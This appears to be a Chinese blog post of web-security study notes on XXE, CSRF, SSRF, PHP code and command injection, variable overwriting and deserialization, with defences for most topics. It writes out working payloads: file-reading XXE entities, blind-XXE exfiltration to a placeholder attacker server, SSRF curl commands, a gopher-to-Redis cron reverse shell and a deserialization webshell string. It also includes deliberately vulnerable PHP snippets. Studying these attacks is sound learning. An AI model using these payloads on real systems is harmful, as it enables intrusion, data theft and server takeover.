+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;syc&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;Anglee&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>test.dtd</strong></p>
+<!ELEMENT head (#PCDATA)>
+
+<!--定义head元素为”#PCDATA”类型-->
+
+<!ELEMENT body (#PCDATA)>
+
+<!--定义body元素为”#PCDATA”类型-->`
+
+<p><strong>PCDATA</strong>的意思是<strong>被解析</strong>的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而<strong>实体会被展开</strong></p>
+<h5 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h5><p>分为内外部</p>
+<p><strong>内部实体声明</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe &quot;Anglee&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>实体：&xxe;</li>
+</ul>
+<p>会回显实体的<strong>值</strong>：Anglee</p>
+<p><strong>外部实体声明</strong></p>
+<ul>
+<li><!ENTITY 实体名称 SYSTEM "**URI/URL**">
+
+</li>
+</ul>
+<p>关键字’SYSTEM’会令XML解析器<strong>从URI中</strong>读取内容，并允许它在XML文档中被替换。</p>
+<p>外部引用可支持<strong>http，file等</strong>协议，不同的语言支持的协议不同，但存在一些通用的协议。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml cersion&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE hack [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;password&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;hack&gt;&amp;xxe;&lt;&#x2F;hack&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>上述代码中，XML的<strong>外部实体</strong>“xxe”被赋予的值为：file:///etc/passwd</p>
+<p>当解析xml文档是，<strong>xxe会被替换为file:///ect/passwd的内容</strong>。</p>
+<p><strong>参数实体声明</strong></p>
+<!ENTITY % 实体名称 "实体的值">
+
+<p>或者</p>
+<!ENTITY % 实体名称 SYSTEM "**URI**">
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+
+<!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
+
+<p>%xxe;]&gt;</p>
+<p><foo>&evil;</foo></p>
+<p>外部evil.dtd中的内容。</p>
+<!ENTITY evil SYSTEM "file:///c:/windows/win.ini" >
+
+<p><strong>回显ini</strong></p>
+<p>* 只有在 DTD 文件中，参数实体的声明才能引用其他<strong>外部实体</strong></p>
+<h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p>两种攻击方式</p>
+<p><strong>1：直接外部实体声明</strong></p>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+
+<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" ><p>]&gt;</p>
+<p><foo>&xxe;</foo></p>
+<p><strong>2：外部DTD声明</strong></p>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+
+<!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
+
+<p>%xxe;]&gt;</p>
+<p><foo>&evil;</foo></p>
+<p>外部evil.dtd中的内容。</p>
+<!ENTITY evil SYSTEM "file:///c:/windows/win.ini" >
+
+<p><strong>内端检测</strong></p>
+<?xml version="1.0" encoding="utf-8"?>
+
+<!DOCTYPE note[
+
+<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
+
+<p>]&gt;</p>
+<p><reset><login>&xxe;</login><secret>test</secret></reset></p>
+<h5 id="blind-xxe"><a href="#blind-xxe" class="headerlink" title="blind xxe"></a>blind xxe</h5><p>可以使用外带数据通道提取数据</p>
+<p>例：</p>
+<p>使用php://filter获取目标文件的=$file，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>
+<!DOCTYPE updateProfile [
+
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php">
+
+<!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
+
+<p>%dtd;</p>
+<p>%send;</p>
+<p>]&gt;</p>
+<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
+<!ENTITY % all
+
+"<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'><p>“</p>
+<p>&gt;</p>
+<p>%all;</p>
+<p>* 有报错，看报错内容可找到数据</p>
+<p>* 无报错，需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据。</p>
+<h5 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h5><p>* billion laughs</p>
+<p>构 造恶意的XML实体文件<strong>耗尽可用内存</strong></p>
+<p>大概就是内部实体一直调用内部实体，10的10次方次。</p>
+<h5 id="找xxe漏洞"><a href="#找xxe漏洞" class="headerlink" title="找xxe漏洞"></a>找xxe漏洞</h5><p>* 抓包注意观察应用程序怎样使用XML传输数据</p>
+<p>* 响应报文是否清晰地展示了解析器已经解析了我们发送的XML实体，然后并将实体内容呈现出来了。</p>
+<p>* 仅使用JSON去访问服务的客户端</p>
+<p>修改Content-Type头部字段</p>
+<p><strong>例</strong>：<a href="https://www.cnblogs.com/ESHLkangi/p/9246327.html" target="_blank" rel="noopener">例子</a></p>
+<h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><p><strong>配置XML处理器</strong>使用开发语言提供的<strong>禁用外部实体</strong>。</p>
+<p>过滤用户提供的XML数据</p>
+<p><strong>过滤关键字：</strong>&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</p>
+<hr>
+<h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>(跨站点请求伪造)</p>
+<h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><p><strong>验证码</strong></p>
+<p>* 就8说了</p>
+<p><strong>验证referer</strong></p>
+<p>* HTTP referer-HTTP表头的一个字段，用来表示从哪儿链接到目前的网页。</p>
+<p><strong>验证请求的token</strong></p>
+<p>* 利用token<strong>防止表单重复提交</strong></p>
+<p>在服务端生成随机标识号token，在当前session域保存这个token，然后把这个token发送至客户端form表单隐藏域，提交表单的时候验证表单服务端token是否一致。</p>
+<p>* token的不可预测原则：md5(salt+参数值)，session或cookie中取参数值结合salt进行验证。</p>
+<p>* token防止csrf</p>
+<p>每个<strong>请求附加</strong>token</p>
+<p>保持参数不变，新加随机参数token。</p>
+<p>token同时放在<strong>表单和session中</strong>，验证一致。（或者非表单 ajex获取数据时放在header）</p>
+<p><strong>xsrf:</strong></p>
+<p>同时存在xss时，请求页面，读出页面内容里的token值，然后再构造出一个合法的请求。</p>
+<hr>
+<h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><p><strong>篡改获取资源的请求</strong>发送给服务器</p>
+<p>服务器以他的身份来访问其他服务器的资源。或外网无法访问的<strong>内部系统</strong>。</p>
+<h6 id="本地利用（一般会禁掉内网ip）"><a href="#本地利用（一般会禁掉内网ip）" class="headerlink" title="本地利用（一般会禁掉内网ip）"></a>本地利用（一般会禁掉内网ip）</h6><p>利用file协议查看文件</p>
+<p>curl -v ‘file:///etc/passwd’</p>
+<p>利用dict探测端口</p>
+<p>curl -v ‘dict://127.0.0.1:22’</p>
+<p>curl -v ‘dict://127.0.0.1:6379/info’</p>
+<p>利用gopher协议反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#39;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="远程利用："><a href="#远程利用：" class="headerlink" title="远程利用："></a>远程利用：</h6><p>利用file协议任意文件读取</p>
+<p>curl -v ‘<code>http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&#39;</code></p>
+<p>类推</p>
+<h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><p><strong>php file_get_contents:</strong></p>
+<p><strong>php fsockopen():</strong></p>
+<p><strong>php curl_exec():</strong></p>
+<h5 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h5><p>抓包分析请求</p>
+<p>右键打开图片</p>
+<p>查找访问的资源地址 例如？image=url</p>
+<h5 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h5><p>* ip地址转换成进制</p>
+<p>* 先到短链接服务的地址之后再302跳转到真实服务器上，如果攻击者对内网地址进行短链处理之后以上代码会判断短链服务的 IP 为合法 IP 而通过校验。</p>
+<hr>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><p>通过请求将<strong>代码</strong>注入并执行</p>
+<p>eval(),assert(),preg_replace,call_user_func,call_user_func_array,array_map,php动态函数：($ a($b))</p>
+<p><a href="http://www.cnblogs.com/xiaozi/p/7834367.html" target="_blank" rel="noopener">函数详解</a></p>
+<h5 id="eval（）与assert（）"><a href="#eval（）与assert（）" class="headerlink" title="eval（）与assert（）"></a>eval（）与assert（）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;PHP?</span><br><span class="line"></span><br><span class="line">$b&#x3D;$_GET[&quot;a&quot;];</span><br><span class="line"></span><br><span class="line">eval($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>http://127.0.0.1/code_eval.php?a=echo phpinfo();</code></p>
+<h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h5><p><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject[, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>因为存在<strong>危险的/e修饰符</strong>，使 preg_replace() <strong>将 replacement 参数当作 PHP 代码</strong></p>
+<ul>
+<li>三种情况</li>
+</ul>
+<p>replacement参数注射</p>
+<p>pattern参数注射</p>
+<p>第三个参数注射</p>
+<p>demo cod</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">preg_replace(&quot;&#x2F;anglee&#x2F;e&quot;,$_GET[&#39;h&#39;],&quot;jutst test anglee1!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当我们提交 <a href="http://127.0.0.1/preg_replace2.php?h=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/preg_replace2.php?h=phpinfo()</a> 即</p>
+<p>执行phpinfo()。</p>
+<h5 id="动态函数"><a href="#动态函数" class="headerlink" title="动态函数"></a>动态函数</h5><ul>
+<li>PHP函数直接由字符串拼接</li>
+</ul>
+<p>代码示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br><span class="line"></span><br><span class="line">$_GET[&#39;a&#39;]($_GET[&#39;b&#39;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>* get请求的a参数作为函数，b参数作为函数的参数。assert phpinfo。</p>
+<h5 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h5><p>* php.ini中，关闭“allow_url_fopen”。在打开它的情况下，可以通过 phar:// 等协议丢给include，让其执行动态代码。</p>
+<p>* php.ini中，通过<strong>disable_functions</strong>关闭 exec,passthru,shell_exec,system 等函数，禁止PHP调用外部程序。</p>
+<p>* 对于preg_replace()函数，要<strong>放弃使用/e修饰符</strong>，也可以使用preg_replace_callback()函数代替。如果一定要使用该函数，<strong>请保证第二个参数中，对于正则匹配出的对象用单引号包裹</strong></p>
+<p>tips</p>
+<p>Thinkphp框架任意代码执行漏洞利用</p>
+<p>识别内网应用使用的框架，平台，模块以及cms可以为后续的攻击提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。</p>
+<hr>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>* 本质：命令执行产生函数：exec，shell_exec，system，passthru等将参数以dos、shell执行</p>
+<p>* exec() , system() , popen() , passthru() , proc_open() , pcntl_exec() , shell_exec() , 反引号 `（实际上也是使用的shell_exec()）, mail()函数。</p>
+<p>* 最多出现在包含环境包的应用里，这些应用汇有一些额外的小脚本，就会用这些函数来调用。</p>
+<h5 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h5><p>system()</p>
+<p>无需echo，返回并输出最后一行shell结果</p>
+<p>exec()</p>
+<p>不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里。</p>
+<p>passthru()</p>
+<p>只调用命令，把命令的运行结果直接输出到标准输出设备上。</p>
+<p>popen() proc_open()</p>
+<p>不会直接返回执行结果，而是返回一个文件指针</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">popen(&#39;whoami&#39;&gt;&gt;d:&#x2F;2.txt&#39;,&#39;r&#39;)</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>* 可在2.txt看到<u>执行结果</u></p>
+<p>* r w 读写</p>
+<h5 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h5><p>* 用命令防注入函数</p>
+<p>escapeshellcmd() ，过滤整条命令，Windows再特殊字符前加^ , linux (\反斜杠)</p>
+<p>escapshellarg() ,过滤参数， 将参数限制再一堆双引号里。把双引号替换为空格。</p>
+<p>* 用参数白名单</p>
+<p>在配置文件或代码里限定某些参数。</p>
+<hr>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>外部传递参数进来时不是使用的原始数组$_GET(‘a’) 而是把a注册成了一个变量$a</p>
+<p>在此过程中没有验证该变量是否已经存在就直接赋值，导致已有的变量被覆盖掉。</p>
+<p>一般需要结合程序的其他功能进行完整的攻击。</p>
+<h4 id="一些导致覆盖的函数"><a href="#一些导致覆盖的函数" class="headerlink" title="一些导致覆盖的函数"></a>一些导致覆盖的函数</h4><p><strong>extract()</strong></p>
+<p>漏洞由第二个参数决定。</p>
+<p>* 第二个参数为EXTR_OVERWRITE 冲突就覆盖原来的</p>
+<p>* 只传入一个参数，默认EXTR_OVERWRITE</p>
+<p>* EXTR_IF_EXISTS：当前符号表有同名时覆盖。其他时候不注册。</p>
+<p><strong>parse_str</strong></p>
+<p>parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量</p>
+<p><strong>import_request_variables()</strong></p>
+<p>把 get post cookie的参数注册成变量</p>
+<p>用在register_globals被禁止的时候，php4.1-5.4</p>
+<p>import_request_variables ( string $types [, string $prefix ] )</p>
+<p>　　$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀。</p>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a &#x3D; 1; &#x2F;&#x2F;原变量值为1</span><br><span class="line"></span><br><span class="line">import_request_variables(&#39;GP&#39;); &#x2F;&#x2F;?a&#x3D;2</span><br><span class="line"></span><br><span class="line">print_r($a); &#x2F;&#x2F;输出结果为2</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>（$$）变量覆盖</strong></p>
+<p>使用foreach来<strong>遍历数组</strong>中的值，然后再将获取到的数组<strong>键名</strong>作为变量，数组中的<strong>键值</strong>作为变量的值。因此就产生了变量覆盖漏洞。请求?id=2 会将$id的值覆盖，$id=2。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id&#x3D;1</span><br><span class="line"></span><br><span class="line">foreach (array(&#39;_COOKIE&#39;,&#39;_POST&#39;,&#39;_GET&#39;) as $_request)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">foreach ($$_request as $_key&#x3D;&gt;$_value)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$$_key&#x3D; $_value;&#x2F;&#x2F; $id</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $id;&#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h5><p>* 使用原始的变量数组$_get,若考虑可读性，可在代码中定义变量，再将请求中的值赋值给它。</p>
+<p>* 再注册变量之前验证变量是否存在。</p>
+<p>* 自行申明的变量一定要初始化。</p>
+<hr>
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p><strong>序列化</strong>：保存一个对象为字符串, 方便后面调用前一个脚本所产生的变量。</p>
+<p>O:6:”anglee”:<strong>1</strong>:{s:1:”a”;s:6:”nice to meet u”;}</p>
+<p>O代表结构类型为：类，6表示类名长度，接着是类名、属性（成员）个数</p>
+<p>大括号内分别是：属性名类型、长度、名称；值类型、长度</p>
+<p><strong>serialize</strong>和<strong>unserialize</strong></p>
+<p><strong>产生的原因</strong></p>
+<p>* 传给unserialize的参数可控，构造序列化字符串控制对象内部的变量或函数。</p>
+<p>* 魔法函数</p>
+<p>* __construct()当一个对象<strong>创建</strong>时被调用–构造</p>
+<p>__destruct()当一个对象<strong>销毁</strong>时被调用–析构</p>
+<p><strong>toString()当一个对象被当作一个字符串使用(其他类也可能定义了一个类允许</strong>toString读取某个文件。)</p>
+<p>__sleep() 在对象在被序列化<strong>之前</strong>运行</p>
+<p>__wakeup将在序列化之后立即被调用</p>
+<p>* 如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的<strong>变量直接放进这些魔术方法</strong>里面的话，就容易造成很严重的漏洞了。</p>
+<h5 id="magic-function的自动调用的利用。"><a href="#magic-function的自动调用的利用。" class="headerlink" title="magic function的自动调用的利用。"></a>magic function的自动调用的利用。</h5><p><u><strong><strong>wakeup()</strong>destruct()</strong></u></p>
+<p>* unserialize()后会导致<strong>wakeup()</strong>destruct()的直接调用。</p>
+<p>* 比如有个fopen和fwrite在_wakeup()里，它将传入变量作为写对对象，之后再反序列化，我们可以自己搭环境，通过serialize()得到我们想要的序列化字符串,再传进去。&lt;?php phpinfo()； ？&gt;</p>
+<h5 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a>其他利用</h5><p><strong>gadget</strong></p>
+<p>一个魔法函数调用了其他对象，一直溯源。</p>
+<p>_wakeup()里的new一个对象会调用此对象中的_construct()</p>
+<h5 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h5><p>通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
+<p>* <u><strong>例1</strong></u>：类1调用类2，类2中的function名称在类3中也有，就能构造pop链，调用类3的function。</p>
+<p>构造方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class 1 &#123;</span><br><span class="line"></span><br><span class="line">protected $ClassObj;</span><br><span class="line"></span><br><span class="line">function __construct() &#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;ClassObj &#x3D; new 3();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class 3 &#123;</span><br><span class="line"></span><br><span class="line">private $data &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize(new 1()));</span><br><span class="line"></span><br><span class="line">echo &quot;\n\r&quot;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>* <u><strong>例2</strong></u>new一个新的对象1，调用_construct() ,_construct() 里又new了一个新的对象2,这时候就会调用_destruct.但析构方法在脚本执行完之后调用.</p>
+<p>* <u><strong>生成一个文件</strong></u></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class syclover&#123;</span><br><span class="line"></span><br><span class="line">var $member;</span><br><span class="line"></span><br><span class="line">var $filename;</span><br><span class="line"></span><br><span class="line">function __wakeup()&#123;</span><br><span class="line"></span><br><span class="line">$this-&gt;save($this-&gt;filename,$this-&gt;member);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function save($filename,$data)&#123;</span><br><span class="line"></span><br><span class="line">file_put_contents($filename,$data);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&#39;a&#39;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">url(生成一个文件):</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.65.131&#x2F;serialize&#x2F;save_file.php?a&#x3D;O:8:&quot;syclover&quot;:2:&#123;s:8:&quot;filename&quot;;s:12:&quot;&#x2F;tmp&#x2F;syc.php&quot;;s:6:&quot;member&quot;;s:1:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="绕过-wakeup（）"><a href="#绕过-wakeup（）" class="headerlink" title="绕过_wakeup（）"></a>绕过_wakeup（）</h5><p>当成员属性数目大于实际数目时可绕过wakeup方法</p>
+<p><code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}</code></p>
+<p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html" target="_blank" rel="noopener">ctf</a></p>
+<p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">详解</a></p>
+<h5 id="反序列化session"><a href="#反序列化session" class="headerlink" title="反序列化session"></a>反序列化session</h5><p>存在于反序列化session的过程</p>
+<p><strong>session序列化机制：</strong></p>
+<p>当session_start()被调用作者php.ini中session.auto_start=1时，访问用户session被序列化以后会存储到指定目录（默认为/tmp）</p>
+<p>* PHP处理器的<strong>三种序列化方式</strong>：</p>
+<p>php_binary</p>
+<p>键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值</p>
+<p>php</p>
+<p>键名＋竖线＋经过serialize()函数反序列处理的值</p>
+<p>php_serialize</p>
+<p>serialize()函数反序列处理数组方式</p>
+<p>* 如果网站序列化并<strong>存储Session与反序列化并读取Session</strong>的<strong>方式不同</strong>，就可能导致漏洞的产生。</p>
+<p>若在session页面</p>
+<p><code>ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</code></p>
+<p>传入</p>
+<p>a=<code>|O:6:&quot;anglee&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}</code></p>
+<p>在/tmp下生成</p>
+<p><code>a:1:{s:6:&quot;anglee&quot;;s:52:&quot;|O:6:&quot;anglee&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;&lt;?php phpinfo()?&gt;&quot;;}&quot;;}</code></p>
+<p>访问利用页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;)</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class 1&#123;</span><br><span class="line"></span><br><span class="line">var $b;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line"></span><br><span class="line">$fp &#x3D; fopen(&quot;D:\phpStudy\PHPTutorial\WWW\test\shell.php&quot;,&quot;w&quot;);</span><br><span class="line"></span><br><span class="line">fputs($fp,$this-&gt;b);</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问test.php时反序列化已存储的session</p>
+<p>新的php处理方式会把“|”后的值当作KEY值再3serialize()，相当于实例化了这个页面的1类，相当于执行:</p>
+<p><code>$_SESSION[&#39;a&#39;] = new anglee();</code></p>
+<p><code>$_SESSION[&#39;anglee&#39;]-&gt;b = &#39;&lt;?php phpinfo()?&gt;&#39;;</code></p>
+<p>成功写入</p>
